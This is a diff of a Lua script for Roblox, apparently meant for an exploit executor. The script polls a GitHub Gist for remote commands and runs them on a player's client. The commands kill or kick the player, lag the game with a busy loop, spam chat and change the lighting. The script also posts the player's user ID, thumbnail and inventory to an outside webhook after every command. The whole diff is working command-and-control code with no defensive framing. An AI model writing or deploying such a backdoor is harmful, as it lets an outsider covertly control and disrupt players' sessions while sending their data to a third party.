@@ -32,100 +32,71 @@ local function sendWebhook(title, desc, color, extraField)
 		{["name"] = "🎒 Inventory", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
 	}
 	if extraField then table.insert(fields, extraField) end
-
-	local data = {
-		["embeds"] = {{
-			["title"] = title,
-			["description"] = desc,
-			["color"] = color,
-			["fields"] = fields,
-			["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
-			["footer"] = {["text"] = "Gist-Control • " .. os.date("%X")}
-		}}
-	}
 	pcall(function()
 		request({
 			Url = WEBHOOK_URL,
 			Method = "POST",
 			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(data)
+			Body = HttpService:JSONEncode({["embeds"] = {{["title"] = title, ["description"] = desc, ["color"] = color, ["fields"] = fields, ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"}, ["footer"] = {["text"] = "Gist-Control • "..os.date("%X")}}}})
 		})
 	end)
 end
 
-local function showScreenMessage(txt)
-	local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
-	local l = Instance.new("TextLabel", sg)
-	l.Size, l.Position = UDim2.new(1, 0, 1, 0), UDim2.new(0,0,0,0)
-	l.BackgroundTransparency, l.TextColor3, l.TextScaled, l.Font = 1, Color3.new(1, 0, 0), true, Enum.Font.FredokaOne
-	l.Text = txt
-	task.delay(5, function() sg:Destroy() end)
+local function resetStates()
+	loops.spam = false
+	if loops.lag then loops.lag:Disconnect() loops.lag = nil end
+	local char = LocalPlayer.Character
+	local hum = char and char:FindFirstChild("Humanoid")
+	if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
+	if char and char:FindFirstChild("HumanoidRootPart") then
+		local f = char.HumanoidRootPart:FindFirstChild("GistFire")
+		if f then f:Destroy() end
+	end
+	Lighting.Brightness = 2 Lighting.ClockTime = 14
 end
 
 local function execute(text)
+	resetStates()
 	local args = string.split(text, " ")
 	local cmd = args[1]:lower()
 	local val = table.concat(args, " ", 2)
 	local char = LocalPlayer.Character
 	local hum = char and char:FindFirstChild("Humanoid")
 
-	if cmd == "kill" and hum then 
-		hum.Health = 0
-	elseif cmd == "kick" then 
-		LocalPlayer:Kick(val)
-	elseif cmd == "rejoin" then 
-		TeleportService:Teleport(game.PlaceId)
-	elseif cmd == "speed" and hum then 
-		hum.WalkSpeed = tonumber(val) or 16
-	elseif cmd == "jump" and hum then 
-		hum.JumpPower = tonumber(val) or 50
+	if cmd == "kill" and hum then hum.Health = 0
+	elseif cmd == "kick" then LocalPlayer:Kick(val)
+	elseif cmd == "rejoin" then TeleportService:Teleport(game.PlaceId)
+	elseif cmd == "speed" and hum then hum.WalkSpeed = tonumber(val) or 16
+	elseif cmd == "jump" and hum then hum.JumpPower = tonumber(val) or 50
 	elseif cmd == "message" then 
-		showScreenMessage(val)
+		local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+		local l = Instance.new("TextLabel", sg)
+		l.Size, l.BackgroundTransparency, l.TextColor3, l.TextScaled, l.Text = UDim2.new(1,0,1,0), 1, Color3.new(1,0,0), true, val
+		task.delay(5, function() sg:Destroy() end)
 	elseif cmd == "fire" and char then 
 		local hrp = char:FindFirstChild("HumanoidRootPart")
 		if hrp then local f = Instance.new("Fire", hrp) f.Name = "GistFire" f.Size = 15 end
-	elseif cmd == "unfire" and char then 
-		local hrp = char:FindFirstChild("HumanoidRootPart")
-		if hrp and hrp:FindFirstChild("GistFire") then hrp.GistFire:Destroy() end
 	elseif cmd == "darktime" then 
 		Lighting.Brightness = 0 Lighting.ClockTime = 0
-		task.delay(5, function() Lighting.Brightness = 2 Lighting.ClockTime = 14 end)
 	elseif cmd == "lag" then 
-		loops.lag = RunService.Heartbeat:Connect(function()
-			local t = tick() while tick() - t < 0.15 do end
-		end)
-	elseif cmd == "unlag" then 
-		if loops.lag then loops.lag:Disconnect() loops.lag = nil end
+		loops.lag = RunService.Heartbeat:Connect(function() local t = tick() while tick() - t < 0.15 do end end)
 	elseif cmd == "chat_spam" then
 		loops.spam = true
-		sendWebhook("💬 Spam Started", "Spamming in progress...", 0xFFFF00, {["name"] = "📝 Message", ["value"] = "```" .. val .. "```"})
 		task.spawn(function()
 			while loops.spam do
-				local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-				if chatEvent then chatEvent.SayMessageRequest:FireServer(val, "All") end
+				local ce = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+				if ce then ce.SayMessageRequest:FireServer(val, "All") end
 				task.wait(0.5)
 			end
 		end)
-	elseif cmd == "stop_spam" then 
-		loops.spam = false
 	end
-
-	if cmd ~= "chat_spam" then
-		sendWebhook("⚡ Command Executed", "**Result:** `" .. text .. "`", 0xFF0044)
-	end
+	sendWebhook("⚡ Command Updated", "**New Cmd:** `" .. text .. "`", 0xFF0044)
 end
 
 task.spawn(function()
-	sendWebhook("🚀 System Online", "Connected and monitoring Gist.", 0x00BFFF)
-	
-	local start = request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"})
-	if start.Success then lastCommand = start.Body:gsub("^%s*(.-)%s*$", "%1") end
-
+	sendWebhook("🚀 System Online", "Monitoring Gist every 2s.", 0x00BFFF)
 	while true do
-		local success, res = pcall(function()
-			return request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"})
-		end)
-
+		local success, res = pcall(function() return request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"}) end)
 		if success and res.Body then
 			local cmd = res.Body:gsub("^%s*(.-)%s*$", "%1")
 			if cmd ~= lastCommand and cmd ~= "" then
